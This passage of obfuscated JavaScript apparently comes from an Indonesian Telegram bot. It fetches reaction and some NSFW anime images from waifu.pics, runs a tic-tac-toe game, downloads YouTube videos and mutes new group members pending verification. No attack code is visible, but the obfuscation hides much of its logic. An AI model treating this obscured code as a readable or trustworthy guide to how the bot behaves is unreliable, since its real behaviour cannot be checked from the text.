_0x49423b['warn'](_0x4a21cc[_0x1c579f(0x18e)],_0x244591[_0x1c579f(0x1b5)]);}break;case _0x1791a4['BVqJV']:{await _0x31b69e[_0x1c579f(0x3f5)+'age']();const _0x13de4e=await _0x1791a4['Hxuod'](_0xcc19f7,'https://ap'+_0x1c579f(0x3ac)+'cs/sfw/yee'+'t'),_0x599d3d=await _0x13de4e['json']();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x599d3d[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x262)](_0x1c579f(0x251),user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x2ef)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case'blush2':{if(_0x1791a4[_0x1c579f(0x3d7)](_0x1c579f(0x23b),_0x1791a4[_0x1c579f(0x2c2)]))return delete _0x4e6032[_0x1c579f(0x2cb)+'rify'][_0x3c5f0b],_0x489eab['telegram']['sendMessag'+'e'](_0x5cbbe6,_0x4a21cc[_0x1c579f(0x2c6)]);else{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x2dbe84=await _0x1791a4[_0x1c579f(0x3ad)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x323)+'sh'),_0x58d4e5=await _0x2dbe84[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x58d4e5[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x3d1)](_0x1791a4[_0x1c579f(0x396)],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}}break;case _0x1791a4[_0x1c579f(0x191)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x13f7f5=await _0x1791a4[_0x1c579f(0x2b5)](_0xcc19f7,'https://ap'+_0x1c579f(0x3ac)+'cs/sfw/smi'+'le'),_0x20f230=await _0x13f7f5[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x20f230[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x3d1)](_0x1791a4['OHFLs'],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x40b)](_0x1c579f(0x266),user_id)}]]}});}break;case _0x1791a4[_0x1c579f(0x23c)]:{if(_0x1791a4[_0x1c579f(0x243)](_0x1c579f(0x382),_0x1791a4[_0x1c579f(0x1fc)])){await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();const _0x39697a=await _0x1791a4[_0x1c579f(0x21e)](_0xcc19f7,'https://ap'+'i.waifu.pi'+_0x1c579f(0x33b)+'e'),_0x45543a=await _0x39697a[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x45543a['url']},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4[_0x1c579f(0x40b)](_0x1791a4[_0x1c579f(0x3e6)],user_id)},{'text':'STOP\x20⛔','callback_data':_0x1791a4[_0x1c579f(0x358)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}else try{_0x2e6ed4['writeFileS'+_0x1c579f(0x1be)](_0x4afc2e,_0x2bca77['stringify'](_0x3970c0,null,0x2),_0x1791a4[_0x1c579f(0x291)]),_0x4c8934[_0x1c579f(0x3ab)](_0x1791a4[_0x1c579f(0x19f)]);}catch(_0x1593cd){_0x3fce2b[_0x1c579f(0x25b)](_0x1791a4[_0x1c579f(0x328)],_0x1593cd);}}break;case _0x1791a4['SlhdY']:{if(_0x1791a4[_0x1c579f(0x3d7)](_0x1c579f(0x335),_0x1791a4[_0x1c579f(0x2a8)]))_0x5f1932={'value':'-'};else{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x207dac=await _0x1791a4[_0x1c579f(0x218)](_0xcc19f7,_0x1c579f(0x2ff)+'i.waifu.pi'+'cs/sfw/hig'+_0x1c579f(0x2eb)),_0xb7f550=await _0x207dac[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0xb7f550[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4['JirFS'],'callback_data':_0x1791a4['SChpf'](_0x1c579f(0x3fe),user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x269)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}}break;case _0x1791a4[_0x1c579f(0x2f2)]:{await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();const _0x4e00a8=await _0x1791a4[_0x1c579f(0x1cc)](_0xcc19f7,_0x1c579f(0x2ff)+'i.waifu.pi'+'cs/sfw/han'+_0x1c579f(0x38d)),_0x5d31ff=await _0x4e00a8[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x5d31ff['url']},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4['kjJym'](_0x1791a4['yrMiB'],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x381)](_0x1791a4['uMEit'],user_id)}]]}});}break;case _0x1791a4[_0x1c579f(0x376)]:{await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();const _0x229456=await _0x1791a4[_0x1c579f(0x36e)](_0xcc19f7,_0x1c579f(0x2ff)+'i.waifu.pi'+_0x1c579f(0x375)),_0x35ce2c=await _0x229456[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x35ce2c['url']},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x262)](_0x1791a4['yLwAr'],user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4['uMEit']+user_id}]]}});}break;case _0x1791a4['YPPCN']:{await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();const _0x184931=await _0x1791a4[_0x1c579f(0x284)](_0xcc19f7,'https://ap'+_0x1c579f(0x3ac)+'cs/sfw/bit'+'e'),_0x4023e5=await _0x184931[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x4023e5[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4['IcyxS'](_0x1c579f(0x245),user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}break;case'glomp2':{await _0x31b69e[_0x1c579f(0x3f5)+'age']();const _0x5ee41c=await _0x1791a4[_0x1c579f(0x2fc)](_0xcc19f7,'https://ap'+'i.waifu.pi'+_0x1c579f(0x1c6)+'mp'),_0x4d5316=await _0x5ee41c[_0x1c579f(0x2fe)]();_0x31b69e['replyWithA'+_0x1c579f(0x32f)]({'url':_0x4d5316[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x356)]+user_id},{'text':_0x1c579f(0x32d),'callback_data':_0x1791a4['uLxQa'](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case'slap2':{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x438f4b=await _0x1791a4[_0x1c579f(0x3ed)](_0xcc19f7,_0x1c579f(0x2ff)+'i.waifu.pi'+_0x1c579f(0x310)+'p'),_0x288e7d=await _0x438f4b[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x288e7d[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4['YhYUJ'](_0x1791a4[_0x1c579f(0x1c5)],user_id)},{'text':'STOP\x20⛔','callback_data':_0x1791a4[_0x1c579f(0x269)](_0x1c579f(0x266),user_id)}]]}});}break;case _0x1791a4[_0x1c579f(0x363)]:{await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();const _0x49cbb4=await _0x1791a4[_0x1c579f(0x2f9)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+'cs/sfw/kil'+'l'),_0x494414=await _0x49cbb4[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x494414[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':'LANJUT\x20📤','callback_data':_0x1791a4[_0x1c579f(0x27d)](_0x1791a4[_0x1c579f(0x30b)],user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}break;case _0x1791a4[_0x1c579f(0x312)]:{await _0x31b69e[_0x1c579f(0x3f5)+'age']();const _0x36cb93=await _0x1791a4[_0x1c579f(0x3ad)](_0xcc19f7,'https://ap'+_0x1c579f(0x3ac)+_0x1c579f(0x296)+'k'),_0x2c3043=await _0x36cb93['json']();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x2c3043[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4[_0x1c579f(0x34d)]+user_id},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}break;case'happy2':{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x7dc820=await _0xcc19f7('https://ap'+_0x1c579f(0x3ac)+'cs/sfw/hap'+'py'),_0x15098e=await _0x7dc820[_0x1c579f(0x2fe)]();_0x31b69e['replyWithA'+_0x1c579f(0x32f)]({'url':_0x15098e[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4['cUqkx'](_0x1791a4[_0x1c579f(0x19e)],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x381)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case _0x1791a4[_0x1c579f(0x2c7)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0xe322ee=await _0x1791a4[_0x1c579f(0x2e9)](_0xcc19f7,'https://ap'+_0x1c579f(0x3ac)+'cs/sfw/win'+'k'),_0x311a75=await _0xe322ee[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x311a75[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x172)](_0x1791a4['HlnPL'],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x358)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case'poke2':{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x34022a=await _0x1791a4['UuOyg'](_0xcc19f7,_0x1c579f(0x2ff)+'i.waifu.pi'+_0x1c579f(0x39e)+'e'),_0x49a1da=await _0x34022a[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x49a1da['url']},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x189)](_0x1791a4[_0x1c579f(0x19a)],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1c579f(0x266)+user_id}]]}});}break;case _0x1791a4[_0x1c579f(0x372)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x535fe3=await _0x1791a4['RAmrT'](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x1a5)+'ce'),_0x5b8a60=await _0x535fe3[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x5b8a60[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x1c2)](_0x1791a4[_0x1c579f(0x35d)],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x1dc)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case'cringe2':{await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();const _0x47befc=await _0x1791a4['kWvpq'](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+'cs/sfw/cri'+_0x1c579f(0x2e4)),_0x2db7dd=await _0x47befc[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x2db7dd[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':'MARKDOWN','reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x315)](_0x1791a4[_0x1c579f(0x33c)],user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}break;case _0x1c579f(0x228):{await _0x31b69e['deleteMess'+'age']();const _0x3a9d6d=await _0x1791a4[_0x1c579f(0x183)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x1cd)+_0x1c579f(0x25f)),_0x333053=await _0x3a9d6d['json']();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x333053[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':'MARKDOWN','reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x1dc)](_0x1791a4[_0x1c579f(0x255)],user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4[_0x1c579f(0x315)]('pepek\x20',user_id)}]]}});}break;case _0x1791a4['ljYlW']:{await _0x31b69e[_0x1c579f(0x3f5)+'age']();const _0x61f956=await _0x1791a4[_0x1c579f(0x27c)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+'cs/nsfw/wa'+'ifu'),_0x199ded=await _0x61f956[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x1d9)+_0x1c579f(0x39f)]({'url':_0x199ded[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':'hentai2\x20'+user_id},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}break;case _0x1791a4[_0x1c579f(0x390)]:{await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();const _0x3f9a95=await _0x1791a4['yXYnX'](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x386)+'ap'),_0x2b0f1c=await _0x3f9a95['json']();_0x31b69e['replyWithP'+'hoto']({'url':_0x2b0f1c[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4['dKrWH']+user_id},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1c579f(0x266)+user_id}]]}});}break;case _0x1791a4[_0x1c579f(0x359)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x1c866b=await _0x1791a4['hqNVb'](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x3e9)+'ko'),_0x4e2c58=await _0x1c866b['json']();_0x31b69e['replyWithP'+_0x1c579f(0x39f)]({'url':_0x4e2c58[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4[_0x1c579f(0x15d)]+user_id},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}break;case _0x1791a4[_0x1c579f(0x1fd)]:{const [_0x6bcc04,_0x5e1c01,_0x15486c]=action;if(_0x1791a4[_0x1c579f(0x410)](_0x31b69e[_0x1c579f(0x20f)+_0x1c579f(0x37f)][_0x1c579f(0x342)]['id'][_0x1c579f(0x21f)](),_0x15486c))return _0x31b69e[_0x1c579f(0x40a)+_0x1c579f(0x37f)](_0x1791a4[_0x1c579f(0x35a)],{'show_alert':!![]});const _0xdec537=data[_0x5e1c01],_0x3320c9=data[_0x15486c];return _0xdec537[_0x1c579f(0x258)][_0x1c579f(0x253)]={'board':_0x1791a4[_0x1c579f(0x185)](Array,0x9)['fill']('\x20'),'turn':'X','playing':!![],'vsBot':![],'enemy':_0x15486c,'win':_0xdec537[_0x1c579f(0x258)][_0x1c579f(0x253)]?.[_0x1c579f(0x343)]||0x0,'lose':_0xdec537[_0x1c579f(0x258)][_0x1c579f(0x253)]?.['lose']||0x0},_0x3320c9[_0x1c579f(0x258)]['tictactoe']={'board':Array(0x9)['fill']('\x20'),'turn':'O','playing':!![],'vsBot':![],'enemy':_0x5e1c01,'win':_0x3320c9['game'][_0x1c579f(0x253)]?.[_0x1c579f(0x343)]||0x0,'lose':_0x3320c9[_0x1c579f(0x258)][_0x1c579f(0x253)]?.[_0x1c579f(0x2e3)]||0x0},await _0x31b69e['editMessag'+_0x1c579f(0x2c0)](_0x1c579f(0x3d0)+_0x1c579f(0x287)),_0x1791a4[_0x1c579f(0x173)](startTicTacToe,_0x5e1c01,_0xae2b55,_0x31b69e['chat']['id']);}break;case _0x1c579f(0x36d):{const [_0x1f9def,_0x57c687,_0x3fed91]=action;if(_0x1791a4['FaNHY'](_0x31b69e['callbackQu'+_0x1c579f(0x37f)]['from']['id'][_0x1c579f(0x21f)](),_0x3fed91))return _0x31b69e[_0x1c579f(0x40a)+_0x1c579f(0x37f)](_0x1791a4[_0x1c579f(0x207)],{'show_alert':!![]});const _0x4d9915=data[_0x3fed91][_0x1c579f(0x258)][_0x1c579f(0x253)];if(!_0x4d9915[_0x1c579f(0x16d)])return _0x31b69e[_0x1c579f(0x40a)+_0x1c579f(0x37f)](_0x1791a4['ceujU']);if(_0x1791a4[_0x1c579f(0x1f3)](_0x4d9915['board'][_0x57c687],'\x20'))return _0x31b69e[_0x1c579f(0x40a)+_0x1c579f(0x37f)](_0x1c579f(0x1b8)+_0x1c579f(0x1c7));_0x4d9915[_0x1c579f(0x369)][_0x57c687]=_0x4d9915[_0x1c579f(0x355)],_0x4d9915[_0x1c579f(0x355)]=_0x4d9915[_0x1c579f(0x355)]==='X'?'O':'X';if(checkWin(_0x4d9915['board'],'X')){const _0x24982f=_0x1791a4[_0x1c579f(0x330)][_0x1c579f(0x19d)]('|');let _0x358523=0x0;while(!![]){switch(_0x24982f[_0x358523++]){case'0':return _0xae2b55['sendMessag'+'e'](_0x31b69e[_0x1c579f(0x2e8)]['id'],_0x1c579f(0x25a)+'ang!\x0a+1500'+_0x1c579f(0x2f5)+_0x1c579f(0x3f6));case'1':data[_0x3fed91]['exp']=(data[_0x3fed91][_0x1c579f(0x409)]||0x0)+0x4b;continue;case'2':_0x4d9915[_0x1c579f(0x343)]++;continue;case'3':data[_0x3fed91]['money']=_0x1791a4[_0x1c579f(0x31b)](data[_0x3fed91][_0x1c579f(0x244)]||0x0,0x5dc);continue;case'4':_0x4d9915[_0x1c579f(0x16d)]=![];continue;}break;}}if(_0x1791a4[_0x1c579f(0x24d)](checkWin,_0x4d9915[_0x1c579f(0x369)],'O')){const _0x467df5='4|2|3|1|0'[_0x1c579f(0x19d)]('|');let _0x8cd205=0x0;while(!![]){switch(_0x467df5[_0x8cd205++]){case'0':return _0xae2b55[_0x1c579f(0x20c)+'e'](_0x31b69e[_0x1c579f(0x2e8)]['id'],_0x1c579f(0x26d)+_0x1c579f(0x3c8)+'oney\x0a-30\x20e'+'xp');case'1':data[_0x3fed91][_0x1c579f(0x409)]=Math[_0x1c579f(0x320)](0x0,(data[_0x3fed91][_0x1c579f(0x409)]||0x0)-0x1e);continue;case'2':_0x4d9915[_0x1c579f(0x16d)]=![];continue;case'3':data[_0x3fed91][_0x1c579f(0x244)]=Math[_0x1c579f(0x320)](0x0,(data[_0x3fed91][_0x1c579f(0x244)]||0x0)-0x2bc);continue;case'4':_0x4d9915[_0x1c579f(0x2e3)]++;continue;}break;}}if(!_0x4d9915[_0x1c579f(0x369)][_0x1c579f(0x166)]('\x20'))return _0x4d9915[_0x1c579f(0x16d)]=![],data[_0x3fed91][_0x1c579f(0x244)]=_0x1791a4[_0x1c579f(0x267)](data[_0x3fed91]['money']||0x0,0x1f4),data[_0x3fed91][_0x1c579f(0x409)]=(data[_0x3fed91]['exp']||0x0)+0x19,_0xae2b55[_0x1c579f(0x20c)+'e'](_0x31b69e[_0x1c579f(0x2e8)]['id'],_0x1c579f(0x2f4)+_0x1c579f(0x286)+_0x1c579f(0x1bb));return await _0x1791a4[_0x1c579f(0x2e9)](_0x52eeb9,data),_0x1791a4[_0x1c579f(0x1f1)](startTicTacToe,_0x3fed91,_0xae2b55,_0x31b69e[_0x1c579f(0x2e8)]['id']);}break;case _0x1791a4['WKJSc']:{if(!args[0x2])return _0x1791a4[_0x1c579f(0x3d3)](_0x1ee691,_0x1c579f(0x33d)+_0x1c579f(0x3a4)+'p4\x20link\x20yo'+'utube\x0a\x0aCon'+_0x1c579f(0x304)+_0x1c579f(0x180)+_0x1c579f(0x3ae)+_0x1c579f(0x1fa)+_0x1c579f(0x1a2)+'4');if(!_0x1791a4['iidDx'](_0x49cc72,args[0x2]))return _0x1791a4[_0x1c579f(0x185)](_0x1ee691,_0x1c579f(0x33d)+_0x1c579f(0x3a4)+_0x1c579f(0x2e7)+_0x1c579f(0x367)+_0x1c579f(0x304)+_0x1c579f(0x180)+'p4\x20https:/'+_0x1c579f(0x1fa)+_0x1c579f(0x1a2)+'4');if(!args[0x2][_0x1c579f(0x166)](_0x1791a4[_0x1c579f(0x2bb)])&&!args[0x2][_0x1c579f(0x166)](_0x1791a4[_0x1c579f(0x3e3)]))return _0x1791a4['EHqMB'](_0x1ee691,_0x1c579f(0x33d)+_0x1c579f(0x3a4)+_0x1c579f(0x2e7)+_0x1c579f(0x367)+_0x1c579f(0x304)+_0x1c579f(0x180)+_0x1c579f(0x3ae)+_0x1c579f(0x1fa)+_0x1c579f(0x1a2)+'4');_0x1ee691(lang[_0x1c579f(0x391)]),await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();let _0x20961e=await _0xcc19f7(_0x1c579f(0x1a6)+_0x1c579f(0x270)+_0x1c579f(0x1e3)+_0x1c579f(0x202)+_0x1c579f(0x357)+args[0x2]);if(!_0x20961e['ok'])throw await _0x20961e['text']();var _0x499ccf=await _0x20961e[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x275)+'ideo']({'url':_0x499ccf[_0x1c579f(0x319)]},{'caption':lang['ok']});}break;}}catch(_0x1ec9b8){console[_0x1c579f(0x3ab)](_0x1ec9b8);}}),_0xae2b55[_0x4913e8(0x2d6)](_0x4913e8(0x3fd),async _0x4da002=>{const _0x6a9a7c=_0x4913e8;user=_0x42dde5['getUserNam'+'e'](_0x4da002['message'][_0x6a9a7c(0x342)]),await _0x4da002[_0x6a9a7c(0x15b)](lang[_0x6a9a7c(0x292)](BOT_NAME,user[_0x6a9a7c(0x194)]),{'parse_mode':_0x285757[_0x6a9a7c(0x301)],'disable_web_page_preview':!![],'reply_markup':{'inline_keyboard':[[{'text':_0x6a9a7c(0x3d9),'url':OWNER[0x0]}]]}});}),_0xae2b55[_0x4913e8(0x2d6)](_0x285757[_0x4913e8(0x1c8)],async _0x1fb249=>{const _0x915afa=_0x4913e8;let _0x4b3d46=_0x42dde5[_0x915afa(0x1f2)+'e'](_0x1fb249[_0x915afa(0x1b5)][_0x915afa(0x342)]);await _0x1fb249[_0x915afa(0x15b)](lang[_0x915afa(0x292)](BOT_NAME,_0x4b3d46['full_name']),{'parse_mode':_0x1791a4[_0x915afa(0x30c)],'disable_web_page_preview':!![],'reply_markup':{'inline_keyboard':[[{'text':_0x915afa(0x3d9),'url':OWNER[0x0]}]]}});}),_0xae2b55['on'](_0x285757['jXYYQ'],async _0x3dbf8a=>{const _0x32496f=_0x4913e8,_0x487b1c=_0x3dbf8a[_0x32496f(0x1b5)],_0x3e24ca=_0x487b1c[_0x32496f(0x2e8)]['title'],_0x48e0bb=await _0xae2b55[_0x32496f(0x299)][_0x32496f(0x3cc)+_0x32496f(0x227)](_0x487b1c[_0x32496f(0x2e8)]['id']);let _0x265eb3=new Date(_0x285757[_0x32496f(0x378)](new Date(),0x36ee80)),_0x4140ba='id',_0x4ddbe6=_0x265eb3[_0x32496f(0x241)+_0x32496f(0x29f)](_0x4140ba,{'weekday':_0x285757['CJwmH']}),_0x558093=_0x265eb3[_0x32496f(0x241)+_0x32496f(0x29f)](_0x4140ba,{'day':_0x285757[_0x32496f(0x276)],'month':_0x285757[_0x32496f(0x374)],'year':_0x285757[_0x32496f(0x276)]});const _0x2446f8=_0x3672f0['tz'](_0x285757[_0x32496f(0x293)])[_0x32496f(0x18a)](_0x285757[_0x32496f(0x1af)]);for(x of _0x487b1c[_0x32496f(0x3a2)+_0x32496f(0x26a)]){const _0x3974d7=_0x42dde5[_0x32496f(0x412)](x)[_0x32496f(0x194)],_0x531de4=_0x32496f(0x3bf)+'o\x20'+_0x3e24ca+_0x32496f(0x3c7)+_0x3974d7+_0x32496f(0x2b8)+x['id']+_0x32496f(0x1da)+_0x48e0bb+('\x20Members`\x0a'+'📆\x20:\x20`')+_0x4ddbe6+',\x20'+_0x558093+_0x32496f(0x1db)+_0x2446f8+(_0x32496f(0x29c)+_0x32496f(0x212)),_0x157652=_0x487b1c[_0x32496f(0x2e8)]['id'],{isWelcomeEnabled:_0x537231}=_0x285757[_0x32496f(0x24c)](require,_0x32496f(0x1d4)+_0x32496f(0x3ea));_0x537231(_0x157652)&&(await _0xae2b55[_0x32496f(0x299)][_0x32496f(0x3b2)](_0x157652,_0x285757['TsQxv'],{'caption':_0x531de4,'parse_mode':_0x32496f(0x2f6)}),await _0xae2b55[_0x32496f(0x299)][_0x32496f(0x1c3)+_0x32496f(0x224)](_0x157652,x['id'],{'permissions':{'can_send_messages':![]}}),global[_0x32496f(0x277)+'upVerify'][x['id']]={'groupId':_0x157652,'full_name':_0x3974d7,'welcomeMsgId':null});}}),_0xae2b55['on'](_0x285757[_0x4913e8(0x1e9)],async _0x29843f=>{const _0x1d0071=_0x4913e8,_0x5c371b=_0x29843f[_0x1d0071(0x1b5)],_0x34069c=_0x5c371b['chat'][_0x1d0071(0x181)],_0xb8d895=await 